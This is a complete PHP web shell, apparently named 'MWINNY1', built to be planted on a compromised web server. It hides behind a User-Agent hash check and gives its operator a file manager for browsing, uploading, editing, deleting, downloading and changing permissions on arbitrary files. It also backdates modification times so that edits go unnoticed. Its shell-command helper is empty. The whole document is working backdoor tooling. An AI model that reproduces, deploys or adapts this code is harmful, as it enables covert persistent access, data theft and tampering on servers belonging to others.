<?php

if ( md5(getenv('HTTP_USER_AGENT')) != '69bc3b342502573e6d727f341674f010') 
header('Location: ' . 'http://' . $_SERVER['HTTP_HOST'] );
$color = "#df5";
$dflt_actn = 'FilesWin';
@define('SELF_PATH', __FILE__);
@session_start();
@ini_set('max_execution_time',0);
if( get_magic_quotes_gpc() ) {
	function stripslashes_array($array) {
		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
	}
	$_POST = stripslashes_array($_POST);
}

if( strtolower( substr(PHP_OS,0,3) ) == "win" )
	$os = 'win';
else
	$os = 'nix';

$home_cwd = @getcwd();
if( isset( $_POST['c'] ) )
	@chdir($_POST['c']);
$cwd = @getcwd();

if( $os == 'win') {
	$home_cwd = str_replace("\\", "/", $home_cwd);
	$cwd = str_replace("\\", "/", $cwd);
}
if( $cwd[strlen($cwd)-1] != '/' )
	$cwd .= '/';
	

function printHeader() {
	if(empty($_POST['charset']))
		$_POST['charset'] = "UTF-8";
	global $color;
	?>

<html><head><meta http-equiv='Content-Type' content='text/html; charset=<?php echo $_POST['charset']?>'><title><?php echo $_SERVER['HTTP_HOST']?> - MWINNY1 </title>
<style>
body{background-color:#444;color:#e1e1e1;}
body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
table.info{ color:#fff;background-color:#222; }
span,h1,a{ color:<?php echo $color?> !important; }
span{ font-weight: bolder; }
h1{ border-left:5px solid <?php echo $color?>;padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }
div.content{ padding: 5px;margin-left:5px;background-color:#333; }
a{ text-decoration:none; }
a:hover{ text-decoration:underline; }
.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
.bigarea{ width:100%;height:250px; }
input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid <?php echo $color?>; font: 9pt Monospace,"Courier New"; }
form{ margin:0px; }
#toolsTbl{ text-align:center; }
.toolsInp{ width: 300px }
.main th{text-align:left;background-color:#5e5e5e;}
.main tr:hover{background-color:#5e5e5e}
.l1{background-color:#444}
pre{font-family:Courier,Monospace;}
</style>
<script>
	var c_ = '<?php echo htmlspecialchars($GLOBALS['cwd'])?>';
	var a_ = '<?php echo htmlspecialchars(@$_POST['a'])?>';
	var p1_ = '<?php echo (strpos(@$_POST['p1'],"\n")!==false)?'':addslashes(htmlspecialchars(@$_POST['p1']))?>';
	var p2_ = '<?php echo (strpos(@$_POST['p2'],"\n")!==false)?'':addslashes(htmlspecialchars(@$_POST['p2']))?>';
	var p3_ = '<?php echo (strpos(@$_POST['p3'],"\n")!==false)?'':addslashes(htmlspecialchars(@$_POST['p3']))?>';
	var charset_ = '<?php echo htmlspecialchars(@$_POST['charset'])?>';
	function set(a,c,p1,p2,p3,charset) {
		if(a != null)document.mf.a.value=a;else document.mf.a.value=a_;
		if(c != null)document.mf.c.value=c;else document.mf.c.value=c_;
		if(p1 != null)document.mf.p1.value=p1;else document.mf.p1.value=p1_;
		if(p2 != null)document.mf.p2.value=p2;else document.mf.p2.value=p2_;
		if(p3 != null)document.mf.p3.value=p3;else document.mf.p3.value=p3_;
		if(charset != null)document.mf.charset.value=charset;else document.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		document.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = "ajax=true";
		for(i=0;i<document.mf.elements.length;i++)
			params += "&"+document.mf.elements[i].name+"="+encodeURIComponent(document.mf.elements[i].value);
		sr('<?php echo $_SERVER['REQUEST_URI'];?>', params);
	}
	function sr(url, params) {	
		if (window.XMLHttpRequest) {
			req = new XMLHttpRequest();
			req.onreadystatechange = processReqChange;
			req.open("POST", url, true);
			req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
			req.send(params);
		} 
		else if (window.ActiveXObject) {
			req = new ActiveXObject("Microsoft.XMLHTTP");
			if (req) {
				req.onreadystatechange = processReqChange;
				req.open("POST", url, true);
				req.setRequestHeader ("Content-Type", "application/x-www-form-urlencoded");
				req.send(params);
			}
		}
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {
				var reg = new RegExp("(\\d+)([\\S\\s]*)", "m");
				var arr=reg.exec(req.responseText);
				
			} 
			else alert("Request error!");
	}
</script>
<head><body><div style="position:absolute;width:100%;background-color:#444;top:0;left:0;">
<form method=post name=mf style='display:none;'>
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form>
<?php
	if(!function_exists('posix_getegid')) {
		$user = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = '';
		$gid = '';
		$user = '';
		$uid = '';
		$group = '';
		$gid = '';
	}
	$cwd_links = '';
	$path = explode("/", $GLOBALS['cwd']);
	$n=count($path);
	for($i=0;$i<$n-1;$i++) {
		$cwd_links .= "<a href='#' onclick='g(\"FilesWin\",\"";
		for($j=0;$j<=$i;$j++)
			$cwd_links .= $path[$j].'/';
		$cwd_links .= "\")'>".$path[$i]."/</a>";
	}
	$charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
	$opt_charsets = '';
	foreach($charsets as $item)
		$opt_charsets .= '<option value="'.$item.'" '.($_POST['charset']==$item?'selected':'').'>'.$item.'</option>';
	$drives = "";
	if ($GLOBALS['os'] == 'win') {
		foreach( range('c','z') as $drive )
		if (is_dir($drive.':\\'))
			$drives .= '<a href="#" onclick="g(\'FilesWin\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
	}
	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr>'.
		 '<td><br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesWin\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
		 '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">'.$opt_charsets.'</optgroup></select></td></tr></table>'.
		 '<div style="margin:5">';
}

function printFooter() {
	$is_writable = is_writable($GLOBALS['cwd'])?"<font color=green>[ Writeable ]</font>":"<font color=red>[ Not writable ]</font>";
?>
</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style="border-top:2px solid #333;border-bottom:2px solid #333;">
	<tr>
		<td><form onsubmit="g(null,this.c.value);return false;"><span>Change dir:</span><br><input class="toolsInp" type=text name=c value="<?php echo htmlspecialchars($GLOBALS['cwd']);?>"><input type=submit value=">>"></form></td>
		<td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form></td>
	</tr>
	<tr>
		<td><form onsubmit="g('FilesWin',null,'mkdir',this.d.value);return false;"><span>Make dir:</span><br><input class="toolsInp" type=text name=d><input type=submit value=">>"></form><?php echo $is_writable?></td>
		<td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span><br><input class="toolsInp" type=text name=f><input type=submit value=">>"></form><?php echo $is_writable?></td>
	</tr>
	<tr>
		<td></td>
		<td><form method='post' ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesWin'>
		<input type=hidden name=c value='<?php echo htmlspecialchars($GLOBALS['cwd'])?>'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=charset value='<?php echo isset($_POST['charset'])?$_POST['charset']:''?>'>
		<span>Upload file:</span><br><input class="toolsInp" type=file name=f><input type=submit value=">>"></form><?php echo $is_writable?></td>
	</tr>

</table>
</div>
</body></html>
<?php
}
function ex($in) {
	$out = '';
	return $out;
}
function viewSize($s) {
	if($s >= 1073741824)
		return sprintf('%1.2f', $s / 1073741824 ). ' GB';
	elseif($s >= 1048576)
		return sprintf('%1.2f', $s / 1048576 ) . ' MB';
	elseif($s >= 1024)
		return sprintf('%1.2f', $s / 1024 ) . ' KB';
	else
		return $s . ' B';
}
function perms($p) {
	if (($p & 0xC000) == 0xC000)$i = 's';
	elseif (($p & 0xA000) == 0xA000)$i = 'l';
	elseif (($p & 0x8000) == 0x8000)$i = '-';
	elseif (($p & 0x6000) == 0x6000)$i = 'b';
	elseif (($p & 0x4000) == 0x4000)$i = 'd';
	elseif (($p & 0x2000) == 0x2000)$i = 'c';
	elseif (($p & 0x1000) == 0x1000)$i = 'p';
	else $i = 'u';
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}
function viewPermsColor($f) { 
	if (!@is_readable($f))
		return '<font color=#FF0000><b>'.perms(@fileperms($f)).'</b></font>';
	elseif (!@is_writable($f))
		return '<font color=white><b>'.perms(@fileperms($f)).'</b></font>';
	else
		return '<font color=#00BB00><b>'.perms(@fileperms($f)).'</b></font>';
}
if(!function_exists("scandir")) {
	function scandir($dir) {
		$dh  = opendir($dir);
		while (false !== ($filename = readdir($dh))) {
    		$files[] = $filename;
		}
		return $files;
	}
}
function which($p) {
	$path = ex('which '.$p);
	if(!empty($path))
		return $path;
	return false;
}


function actionFilesWin() {
	printHeader();
	echo '<h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>';
	if(!empty($_POST['p1'])) {
		switch($_POST['p1']) {
			case 'uploadFile':
				if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']))
					echo "Can't upload file!";
				break;
			case 'mkdir':
				if(!@mkdir($_POST['p2']))
					echo "Can't create new dir";
				break;
			case 'delete':
				function deleteDir($path) {
					$path = (substr($path,-1)=='/') ? $path:$path.'/';
					$dh  = opendir($path);
					while ( ($item = readdir($dh) ) !== false) {
						$item = $path.$item;
						if ( (basename($item) == "..") || (basename($item) == ".") )
							continue;
						$type = filetype($item);
						if ($type == "dir")
							deleteDir($item);
						else
							@unlink($item);
					}
					closedir($dh);
					rmdir($path);
				}
				if(is_array(@$_POST['f']))
					foreach($_POST['f'] as $f) {
						$f = urldecode($f);
						if(is_dir($f))
							deleteDir($f);
						else
							@unlink($f);
					}
				break;
			case 'paste':
				if($_SESSION['act'] == 'copy') {
					function copy_paste($c,$s,$d){
						if(is_dir($c.$s)){
							mkdir($d.$s);
							$h = @opendir($c.$s);
							while (($f = @readdir($h)) !== false)
								if (($f != ".") and ($f != "..")) {
									copy_paste($c.$s.'/',$f, $d.$s.'/');
								}
						} elseif(is_file($c.$s)) {
							@copy($c.$s, $d.$s);
						}
					}
					foreach($_SESSION['f'] as $f)
						copy_paste($_SESSION['c'],$f, $GLOBALS['cwd']);					
				} elseif($_SESSION['act'] == 'move') {
					function move_paste($c,$s,$d){
						if(is_dir($c.$s)){
							mkdir($d.$s);
							$h = @opendir($c.$s);
							while (($f = @readdir($h)) !== false)
								if (($f != ".") and ($f != "..")) {
									copy_paste($c.$s.'/',$f, $d.$s.'/');
								}
						} elseif(@is_file($c.$s)) {
							@copy($c.$s, $d.$s);
						}
					}
					foreach($_SESSION['f'] as $f)
						@rename($_SESSION['c'].$f, $GLOBALS['cwd'].$f);
				} elseif($_SESSION['act'] == 'zip') {
					
				} elseif($_SESSION['act'] == 'unzip') {
					
				}
				unset($_SESSION['f']);
				break;
			default:
				if(!empty($_POST['p1']) && (($_POST['p1'] == 'copy')||($_POST['p1'] == 'move')||($_POST['p1'] == 'zip')||($_POST['p1'] == 'unzip')) ) {
					$_SESSION['act'] = @$_POST['p1'];
					$_SESSION['f'] = @$_POST['f'];
					foreach($_SESSION['f'] as $k => $f)
						$_SESSION['f'][$k] = urldecode($f);
					$_SESSION['c'] = @$_POST['c'];
				}
				break;
		}
	}
	$dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
	if($dirContent === false) {	echo 'Can\'t open this folder!';printFooter(); return;	}
	global $sort;
	$sort = array('name', 1);
	if(!empty($_POST['p1'])) {
		if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
			$sort = array($match[1], (int)$match[2]);
	}
?>
<script>
	function sa() {
		for(i=0;i<document.files.elements.length;i++)
			if(document.files.elements[i].type == 'checkbox')
				document.files.elements[i].checked = document.files.elements[0].checked;
	}
</script>
<table width='100%' class='main' cellspacing='0' cellpadding='2'>
<form name=files method=post>
<?php
	echo "<tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesWin\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesWin\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesWin\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesWin\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
	$dirs = $files = $links = array();
	$n = count($dirContent);
	for($i=0;$i<$n;$i++) {
		$ow = '';
		$gr = '';
		$tmp = array('name' => $dirContent[$i],
					 'path' => $GLOBALS['cwd'].$dirContent[$i],
					 'modify' => date('Y-m-d H:i:s',@filemtime($GLOBALS['cwd'].$dirContent[$i])),
					 'perms' => viewPermsColor($GLOBALS['cwd'].$dirContent[$i]),
					 'size' => @filesize($GLOBALS['cwd'].$dirContent[$i])
					);
		if(@is_file($GLOBALS['cwd'].$dirContent[$i]))
			$files[] = array_merge($tmp, array('type' => 'file'));
		elseif(@is_link($GLOBALS['cwd'].$dirContent[$i]))
			$links[] = array_merge($tmp, array('type' => 'link'));
		elseif(@is_dir($GLOBALS['cwd'].$dirContent[$i])&& ($dirContent[$i] != "."))
			$dirs[] = array_merge($tmp, array('type' => 'dir'));
	}
	$GLOBALS['sort'] = $sort;
	function cmp($a, $b) {
		if($GLOBALS['sort'][0] != 'size')
			return strcmp($a[$GLOBALS['sort'][0]], $b[$GLOBALS['sort'][0]])*($GLOBALS['sort'][1]?1:-1);
		else
			return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
	}
	usort($files, "cmp");
	usort($dirs, "cmp");
	usort($links, "cmp");
	$files = array_merge($dirs, $links, $files);
	$l = 0;
	foreach($files as $f) {
		echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesWin\',\''.$f['path'].'\');"><b>[ '.htmlspecialchars($f['name']).' ]</b>').'</a></td><td>'.(($f['type']=='file')?viewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
			.'</td><td><a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'</td></tr>';
		$l = $l?0:1;
	}
	?>
	<tr><td colspan=7>
	<input type=hidden name=a value='FilesWin'>
	<input type=hidden name=c value='<?php echo htmlspecialchars($GLOBALS['cwd'])?>'>
	<input type=hidden name=charset value='<?php echo isset($_POST['charset'])?$_POST['charset']:''?>'>
	<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option><?php if(class_exists('ZipArchive')){?><option value='zip'>Compress (zip)</option><?php }?><option value='unzip'>Uncompress (zip)</option><?php if(!empty($_SESSION['act'])&&@count($_SESSION['f'])){?><option value='paste'>Paste / zip</option><?php }?></select>&nbsp;<input type="submit" value=">>"></td></tr>
	</form></table></div>
	<?php
	printFooter();
}

function actionFilesTools() {
	if( isset($_POST['p1']) )
		$_POST['p1'] = urldecode($_POST['p1']);
	if(@$_POST['p2']=='download') {
		if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
			ob_start("ob_gzhandler", 4096);
			header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
			if (function_exists("mime_content_type")) {
				$type = @mime_content_type($_POST['p1']);
				header("Content-Type: ".$type);
			}
			$fp = @fopen($_POST['p1'], "r");
			if($fp) {
				while(!@feof($fp))
					echo @fread($fp, 1024);
				fclose($fp);
			}
		}exit;
	}
	if( @$_POST['p2'] == 'mkfile' ) {
		if(!file_exists($_POST['p1'])) {
			$fp = @fopen($_POST['p1'], 'w');
			if($fp) {
				$_POST['p2'] = "edit";
				fclose($fp);
			}
		}
	}
	printHeader();
	echo '<h1>File tools</h1><div class=content>';
	if( !file_exists(@$_POST['p1']) ) {
		echo 'File not exists';
		printFooter();
		return;
	}
	$uid = '';
	if(!$uid) {
		$uid['name'] = @fileowner($_POST['p1']);
		$gid['name'] = @fileowner($_POST['p1']);
	} else $gid = @posix_getgrgid(@fileowner($_POST['p1']));
	echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?viewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.viewPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
	echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>';
	if( empty($_POST['p2']) )
		$_POST['p2'] = 'view';
	if( is_file($_POST['p1']) )
		$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
	else
		$m = array('Chmod', 'Rename', 'Touch');
	foreach($m as $v)
		echo '<a href=# onclick="g(null,null,null,\''.strtolower($v).'\')">'.((strtolower($v)==@$_POST['p2'])?'<b>[ '.$v.' ]</b>':$v).'</a> ';
	echo '<br><br>';
	switch($_POST['p2']) {
		case 'view':
			echo '<pre class=ml1>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</pre>';
			break;
		case 'highlight':
			if( @is_readable($_POST['p1']) ) {
				echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
				$code = @highlight_file($_POST['p1'],true);
				echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div>';
			}
			break;
		case 'chmod':
			if( !empty($_POST['p3']) ) {
				$perms = 0;
				for($i=strlen($_POST['p3'])-1;$i>=0;--$i)
					$perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
				if(!@chmod($_POST['p1'], $perms))
					echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,null,null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value=">>"></form>';
			break;
		case 'edit':
			if( !is_writable($_POST['p1'])) {
				echo 'File isn\'t writeable';
				break;
			}
			if( !empty($_POST['p3']) ) {
				$time = @filemtime($_POST['p1']);
				$_POST['p3'] = substr($_POST['p3'],1);
				$fp = @fopen($_POST['p1'],"w");
				if($fp) {
					@fwrite($fp,$_POST['p3']);
					@fclose($fp);
					echo 'Saved!<br><script>p3_="";</script>';
					@touch($_POST['p1'],$time,$time);
				}
			}
			echo '<form onsubmit="g(null,null,null,null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</textarea><input type=submit value=">>"></form>';
			break;
		case 'hexdump':
			$c = @file_get_contents($_POST['p1']);
			$n = 0;
			$h = array('00000000<br>','','');
			$len = strlen($c);
			for ($i=0; $i<$len; ++$i) {
				$h[1] .= sprintf('%02X',ord($c[$i])).' ';
				switch ( ord($c[$i]) ) {
					case 0:  $h[2] .= ' '; break;
					case 9:  $h[2] .= ' '; break;
					case 10: $h[2] .= ' '; break;
					case 13: $h[2] .= ' '; break;
					default: $h[2] .= $c[$i]; break;
				}
				$n++;
				if ($n == 32) {
					$n = 0;
					if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
					$h[1] .= '<br>';
					$h[2] .= "\n";
				}
		 	}
			echo '<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
			break;
		case 'rename':
			if( !empty($_POST['p3']) ) {
				if(!@rename($_POST['p1'], $_POST['p3']))
					echo 'Can\'t rename!<br>';
				else
					die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>');
			}
			echo '<form onsubmit="g(null,null,null,null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value=">>"></form>';
			break;
		case 'touch':
			if( !empty($_POST['p3']) ) {
				$time = strtotime($_POST['p3']);
				if($time) {
					if(!touch($_POST['p1'],$time,$time))
						echo 'Fail!';
					else
						echo 'Touched!';
				} else echo 'Bad time format!';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,null,null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value=">>"></form>';
			break;
	}
	echo '</div>';
	printFooter();
}

if( empty($_POST['a']) )
	if(isset($dflt_actn) && function_exists('action' . $dflt_actn))
		$_POST['a'] = $dflt_actn;
	else
		$_POST['a'] = 'SecInfo';
if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
	call_user_func('action' . $_POST['a']);
?>